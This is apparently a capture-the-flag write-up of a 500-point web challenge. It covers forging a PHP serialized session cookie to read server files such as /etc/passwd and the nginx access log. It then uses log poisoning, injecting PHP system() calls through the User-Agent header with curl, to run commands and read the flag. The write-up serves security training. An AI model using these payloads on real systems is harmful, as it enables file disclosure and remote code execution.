Category: Web

Points: 500

Author: charliepy

---
### Solution
After opening the challenge link, we land on this page:

![](attachments/Pasted%20image%2020251109205139.png)

During enumeration I discovered the key to the challenge: `the session cookie`. The cookie is a `serialized string` that can be manipulated to access another resource on the server.

![](attachments/Capture%20d'écran%202025-11-09%20203653.png)

I used this PHP snippet to reproduce the serialization:

```php
<?php
class ArcaneModel {
    public $armageddon;

    public function __construct(string $path) {
        $this->armageddon = $path;
    }
}

$obj = new ArcaneModel('/www/index.html'); // change this to the target path
echo serialize($obj) . PHP_EOL;
```

![](attachments/Pasted%20image%2020251109205936.png)

By replacing `/www/index.html` with `/etc/passwd` and sending the serialized cookie to the app via Burp Suite, I was able to read `/etc/passwd` from the server.


![](attachments/Pasted%20image%2020251109210736.png)

![](attachments/Pasted%20image%2020251109205900.png)

I tried some path like `/home/www/flag.txt`, `/opt/flag.txt` `/var/www/html/flag.txt` but nothing worked. Then I remembered the log‑poisoning technique used in the challenge [Secure Admin](../Boot2Root/Secure%20Admin.md). This app is running on nginx.

![](attachments/Pasted%20image%2020251109211318.png)

By default, the access log is at `/var/log/nginx/access.log`.

![](attachments/Pasted%20image%2020251109212410.png)

Great !

I decided to injected a PHP payload in the `User Agent` because it appears in the access log and is commonly abused in `log‑poisoning attacks`.

The Proof of concept (PoC) : 

#### In the terminal
```sh
curl -H "User-Agent: <?php system('id'); ?>" http://109.205.181.210:13217/
```


#### In Burp
![](attachments/Pasted%20image%2020251109212815.png)

It worked !

We achieved `RCE`. Instead of getting a`reverse shell`, I decided to use the command `find` to look for any files names like a flag.

#### In the terminal
```sh
curl -H "User-Agent: <?php system('find / -name *flag* 2>/dev/null'); ?>" http://109.205.181.210:13217/
```

#### In Burp
![](attachments/Pasted%20image%2020251109213214.png)

One of the results was `/flag_GWofy`. I read it with:

#### In the terminal
```sh
curl -H "User-Agent: <?php system('cat /flag_GWofy'); ?>" http://109.205.181.210:13217/
```

#### In Burp
![](attachments/Pasted%20image%2020251109213430.png)

Flag: `SADC{L05_P0150NN1NG_15_FUN?????}`

GG!